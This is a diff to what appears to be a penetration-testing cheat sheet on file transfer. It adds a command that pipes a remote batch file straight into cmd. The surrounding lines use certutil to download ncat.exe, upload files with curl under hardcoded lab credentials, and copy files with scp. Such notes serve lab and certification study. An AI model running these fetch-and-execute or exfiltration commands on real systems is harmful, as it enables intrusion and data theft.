@@ -43,6 +43,10 @@ certutil.exe -urlcache -split -f "http://192.168.45.182:8000/ncat.exe"
 ```bash
 curl -X POST http://$tip:8000/upload -F 'files=@$filename' -u offsec:wandton
 ```
+
+```bash
+curl http://server/file.bat | cmd
+```
 ##### SSH
 ```bash
 scp $file $user@$hip:"C:\\Users\\$user\\Downloads"
